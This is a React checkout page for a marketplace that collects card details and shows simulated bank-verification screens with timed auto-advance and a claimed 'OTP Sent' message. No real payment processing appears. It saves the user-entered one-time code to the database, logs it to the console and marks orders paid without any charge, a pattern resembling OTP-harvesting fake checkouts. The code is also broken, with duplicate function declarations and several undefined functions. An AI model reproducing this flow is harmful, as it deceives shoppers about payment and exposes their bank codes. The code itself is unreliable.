import { useState, useEffect, useCallback } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, Package } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useCurrency } from '@/hooks/useCurrency';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';

import CheckoutStepper from '@/components/checkout/CheckoutStepper';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import CardOTPVerification from '@/components/checkout/CardOTPVerification';
import OrderReview from '@/components/checkout/OrderReview';
import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';

interface Product {
  id: string;
  title: string;
  price_min: number | null;
  price_max: number | null;
  images: string[] | null;
  seller_id: string;
  moq: number | null;
}

interface SellerProfile {
  full_name: string | null;
  company_name: string | null;
}

// Define CheckoutStep type locally to avoid import issues
type CheckoutStep = 'shipping' | 'payment' | 'processingPayment' | 'otp' | 'processingOtp' | 'review' | 'confirmation';

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const { formatPriceOnly } = useCurrency();

  const [product, setProduct] = useState<Product | null>(null);
  const [seller, setSeller] = useState<SellerProfile | null>(null);
  const [loading, setLoading] = useState(true);

  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [confirmedTotal, setConfirmedTotal] = useState<number>(0);
  const [quantity, setQuantity] = useState(1);

  const productId = searchParams.get('product');

  // Debug logging
  useEffect(() => {
    console.log('🚀 Checkout State Update:', {
      step,
      productId,
      hasProduct: !!product,
      hasShippingData: !!shippingData,
      hasCardData: !!cardData,
      orderId,
      transactionId,
    });
  }, [step, productId, product, shippingData, cardData, orderId, transactionId]);

  /* ---------------- Guards ---------------- */
  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/auth?redirect=/checkout?product=' + productId);
      return;
    }

    if (user) fetchUserProfile();
    if (productId) fetchProduct();
  }, [productId, user, authLoading]);

  const fetchUserProfile = async () => {
    if (!user) return;
    const { data } = await supabase
      .from('profiles')
      .select('*')
      .eq('user_id', user.id)
      .single();
    if (data) setUserProfile(data);
  };

  const fetchProduct = async () => {
    try {
      const { data: productData, error: productError } = await supabase
        .from('products')
        .select('*')
        .eq('id', productId)
        .single();

      if (productError) throw productError;

      if (productData) {
        setProduct(productData);
        setQuantity(productData.moq || 1);

        const { data: sellerData, error: sellerError } = await supabase
          .from('profiles')
          .select('full_name, company_name')
          .eq('user_id', productData.seller_id)
          .single();

        if (sellerError) {
          console.warn('Could not fetch seller profile:', sellerError);
        }

        if (sellerData) setSeller(sellerData);
      } else {
        toast({
          title: 'Product not found',
          description: 'The product you are trying to purchase is no longer available.',
          variant: 'destructive'
        });
      }
    } catch (error: any) {
      console.error('Error fetching product:', error);
      toast({
        title: 'Error loading product',
        description: error.message,
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
    }
  };

  /* ---------------- Calculate Total ---------------- */
  const calculateTotal = useCallback(() => {
    if (!product) return 0;
    const price = Number(product.price_min ?? product.price_max ?? 0);
    return price * quantity;
  }, [product, quantity]);

  /* ---------------- Shipping ---------------- */
  const handleShippingSubmit = (data: ShippingFormData) => {
    console.log('✅ Shipping submitted:', data);
    setShippingData(data);
    setStep('payment');
  };

  /* ---------------- Payment ---------------- */
  const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
    console.log('✅ Payment submitted for product:', product?.title);

    if (!user || !product) {
      toast({
        title: 'Error',
        description: 'Missing user or product information',
        variant: 'destructive'
      });
      return;
    }

    setCardData(data);
    setStep('processingPayment');

    try {
      const lastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
      const brand = detectCardBrand(data.cardNumber);
      const total = calculateTotal();

      console.log('📝 Creating payment transaction for amount:', total);
      const { data: tx, error } = await supabase
        .from('payment_transactions')
        .insert({
          user_id: user.id,
          amount: total,
          currency: 'USD',
          card_last_four: lastFour,
          card_brand: brand,
          status: 'pending_otp',
        })
        .select()
        .single();

      if (error) throw error;

      console.log('✅ Payment transaction created:', tx.id);
      setTransactionId(tx.id);

    } catch (e: any) {
      console.error('❌ Payment error:', e);
      toast({
        title: 'Payment error',
        description: e.message,
        variant: 'destructive'
      });
      setStep('payment');
    }
  };

  /* ---------------- OTP ---------------- */
  const handleOTPVerified = async (otpCode: string) => {
    console.log('✅ OTP verified with code:', otpCode, 'transactionId:', transactionId);

    if (!transactionId) {
      toast({
        title: 'Error',
        description: 'Transaction ID missing',
        variant: 'destructive'
      });
      return;
    }

    setStep('processingOtp');

    try {
      // Update transaction with OTP code
      const { error } = await supabase
        .from('payment_transactions')
        .update({
          status: 'otp_verified',
          otp_verified: true,
          otp_code: otpCode
        })
        .eq('id', transactionId);

      if (error) throw error;

      console.log('✅ Transaction updated to otp_verified');

      // Auto-proceed to review after 1.5 seconds
      setTimeout(() => {
        console.log('🔄 Moving to review step');
        setStep('review');
      }, 1500);

    } catch (error: any) {
      console.error('❌ OTP verification error:', error);
      toast({
        title: 'OTP Verification Error',
        description: error.message,
        variant: 'destructive'
      });
      setStep('otp'); // Go back to OTP on error
    }
  };

  /* ---------------- Review ---------------- */
  const handleConfirmOrder = async () => {
    console.log('=======================');
    console.log('🚀 handleConfirmOrder START (Single Product)');
    console.log('Product:', product?.title);
    console.log('Quantity:', quantity);
    console.log('User:', user?.id);
    console.log('=======================');

    if (!user || !product || !shippingData || !cardData) {
      console.log('Missing required data:', { user, product, shippingData, cardData });
      toast({
        title: 'Error',
        description: 'Missing required information',
        variant: 'destructive'
      });
      return;
    }

    try {
      const total = calculateTotal();

      // Save total BEFORE creating order
      console.log('💾 Setting confirmedTotal to:', total);
      setConfirmedTotal(total);

      console.log('📦 Creating order for product:', {
        title: product.title,
        price: product.price_min ?? product.price_max,
        quantity: quantity,
        total: total,
        seller_id: product.seller_id
      });

      // Create order in database
      const { data: order, error } = await supabase
        .from('orders')
        .insert({
          buyer_id: user.id,
          seller_id: product.seller_id,
          product_id: product.id,
          quantity: quantity,
          total_price: total,
          status: 'paid',
          shipping_address: JSON.stringify(shippingData),
          tracking_info: {
            shipping_address: shippingData.streetAddress,
            notes: shippingData.additionalNotes || '',
            city: shippingData.city,
            state: shippingData.stateProvince,
            country: shippingData.country,
            postalCode: shippingData.postalCode,
          },
        })
        .select()
        .single();

      if (error) {
        console.error('❌ Order creation error:', error);
        throw error;
      }

      console.log('✅ Order created with ID:', order.id);
      setOrderId(order.id);

      // Update payment transaction with order reference
      if (transactionId) {
        await supabase
          .from('payment_transactions')
          .update({
            order_id: order.id,
            status: 'completed'
          })
          .eq('id', transactionId);
      }

      console.log('=======================');
      console.log('✅ handleConfirmOrder COMPLETE');
      console.log('Order ID created:', order.id);
      console.log('Confirmed total:', total);
      console.log('Step changing to confirmation');
      console.log('=======================');

      setStep('confirmation');
    } catch (e: any) {
      console.error('❌ Order error:', e);
      toast({
        title: 'Order error',
        description: e.message,
        variant: 'destructive'
      });
    }
  };

  const handlePaymentSuccess = async (transactionId: string) => {
    if (!orderId) return;

    await supabase.from('orders').update({
      status: 'paid',
      transaction_id: transactionId,
    }).eq('id', orderId);

    setProcessingContext('payment');
    setStep('processingPayment');
  };

  const handlePaymentProcessed = () => {
    setStep('otp');
  };

  const handleOtpVerified = () => {
    setProcessingContext('otp');
    setStep('processingOtp');
  };

  const handleOtpProcessed = () => {
    setStep('review');
  };

  const handleConfirmOrder = async () => {
    if (!orderId) return;

    await supabase.from('orders').update({
      status: 'confirmed',
    }).eq('id', orderId);

    setStep('confirmation');
  };

  if (loading || authLoading) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8">
          <div className="animate-pulse space-y-4">
            <div className="h-8 w-48 bg-muted rounded" />
            <div className="h-64 bg-muted rounded" />
          </div>
        </div>
      </div>
    );
  }

  if (!product) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8 text-center">
          <h1 className="text-2xl font-bold">Product not found</h1>
          <Button onClick={() => navigate('/products')} className="mt-4">
            Browse Products
          </Button>
        </div>
      </div>
    );
  }

  /* ---------------- Prepare Data for Components ---------------- */
  const orderItems = [{
    id: product.id,
    title: product.title,
    price: Number(product.price_min ?? product.price_max ?? 0),
    quantity,
    image: product.images?.[0] || '/placeholder.svg',
    seller_name: seller?.company_name || seller?.full_name || 'Seller',
    seller_id: product.seller_id,
    product_id: product.id,
  }];

  const cardDisplayData = cardData ? {
    cardholderName: cardData.cardholderName,
    cardNumber: `•••• •••• •••• ${cardData.cardNumber.replace(/\s/g, '').slice(-4)}`,
    expiryMonth: cardData.expiryMonth,
    expiryYear: cardData.expiryYear,
  } : {
    cardholderName: 'N/A',
    cardNumber: '•••• •••• •••• ••••',
    expiryMonth: 'MM',
    expiryYear: 'YY',
  };

  // Ensure shippingData has all required properties for OrderReview
  const safeShippingData = shippingData || {
    fullName: '',
    streetAddress: '',
    city: '',
    stateProvince: '',
    postalCode: '',
    country: '',
    phoneNumber: '',
    email: user?.email || '',
    additionalNotes: '',
  };

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        <CheckoutStepper currentStep={step} />

        <Button
          variant="ghost"
          onClick={handleBack}
          className="mb-6"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back
        </Button>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {step === 'shipping' && (
              <ShippingAddressForm
                onSubmit={handleShippingSubmit}
                defaultValues={shippingData || undefined}
              />
            )}

            {step === 'payment' && (
              <PaymentDetailsForm
                amount={calculateTotal()}
                currency="USD"
                onSubmit={handlePaymentSubmit}
                productName={product.title}
                quantity={quantity}
              />
            )}

            {step === 'processingPayment' && (
              <PaymentProcessingScreen
                title="Processing payment…"
                description="Confirming your card details with your bank."
                onDone={() => {
                  console.log('✅ Processing payment done, moving to OTP');
                  toast({
                    title: 'OTP Sent',
                    description: 'Enter the 6-digit code sent to your phone.'
                  });
                  setStep('otp');
                }}
                autoProceed={true}
                duration={2000}
              />
            )}

            {step === 'otp' && cardData && (
              <CardOTPVerification
                cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                onVerified={handleOTPVerified}
                onResend={() => {
                  console.log('🔄 Resending OTP');
                  toast({ title: 'OTP resent to your phone' });
                }}
                processing={step === 'processingOtp'}
              />
            )}

            {step === 'processingOtp' && (
              <PaymentProcessingScreen
                title="Verifying OTP…"
                description="Finalizing payment authorization with your bank."
                onDone={() => {
                  console.log('✅ OTP processing done, moving to review');
                  setStep('review');
                }}
                autoProceed={true}
                duration={1500}
              />
            )}

            {step === 'review' && (
              <>
                {console.log('📊 Rendering OrderReview with total:', calculateTotal())}
                <OrderReview
                  items={orderItems}
                  shippingData={safeShippingData}
                  cardData={cardDisplayData}
                  totalAmount={calculateTotal()}
                  currency="USD"
                  onConfirm={handleConfirmOrder}
                  onEditShipping={() => setStep('shipping')}
                  onEditPayment={() => setStep('payment')}
                />
              </>
            )}

            {step === 'confirmation' && (
              <>
                {console.log('=======================')}
                {console.log('🎉 Rendering OrderConfirmationSuccess')}
                {console.log('Order ID:', orderId)}
                {console.log('Confirmed total passed to component:', confirmedTotal)}
                {console.log('Current calculated total:', calculateTotal())}
                {console.log('=======================')}
                <OrderConfirmationSuccess
                  orderIds={orderId ? [orderId] : []}
                  totalAmount={confirmedTotal}
                  currency="USD"
                />
              </>
            )}
          </div>

          {step !== 'confirmation' && product && (
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5" />
                    Order Summary
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Product</span>
                      <span className="font-medium truncate max-w-[150px]">{product.title}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Unit Price</span>
                      <span>{formatPriceOnly(product.price_min || product.price_max || 0)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Quantity</span>
                      <span>{quantity}</span>
                    </div>
                  </div>

                  <Separator />

                  <div className="flex justify-between text-lg font-bold">
                    <span>Total</span>
                    <span>{formatPriceOnly(calculateTotal())}</span>
                  </div>

                  <div className="mt-4 text-xs text-muted-foreground">
                    <p className="font-medium">Seller: {seller?.company_name || seller?.full_name || 'Unknown'}</p>
                    <p className="mt-1">MOQ: {product.moq || 1} units</p>
                    <div className="mt-2 pt-2 border-t">
                      <p className="text-[10px]">Debug: ${calculateTotal().toFixed(2)} total</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>

        {/* Debug Panel - Always visible in development */}
        {process.env.NODE_ENV === 'development' && (
          <div className="fixed bottom-4 right-4 z-50 bg-background border rounded-lg p-3 shadow-lg">
            <div className="text-xs font-mono mb-2">🚨 Debug Panel</div>
            <div className="text-xs font-mono mb-2">Step: <span className="font-bold">{step}</span></div>
            <div className="flex flex-col gap-1">
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  console.log('🛠️ DEBUG: Manual step advancement');
                  const steps: CheckoutStep[] = ['shipping', 'payment', 'processingPayment', 'otp', 'processingOtp', 'review', 'confirmation'];
                  const currentIndex = steps.indexOf(step);
                  if (currentIndex < steps.length - 1) {
                    console.log(`🛠️ Moving from ${step} to ${steps[currentIndex + 1]}`);
                    setStep(steps[currentIndex + 1]);
                  }
                }}
              >
                Next Step
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  console.log('🛠️ DEBUG: Simulating OTP verification');
                  handleOTPVerified('123456');
                }}
              >
                Simulate OTP Verify
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={() => console.log('🛠️ State:', {
                  step,
                  transactionId,
                  hasCardData: !!cardData,
                  hasShippingData: !!shippingData,
                  orderId,
                  product: product?.title,
                  total: calculateTotal(),
                  confirmedTotal
                })}
              >
                Log State
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
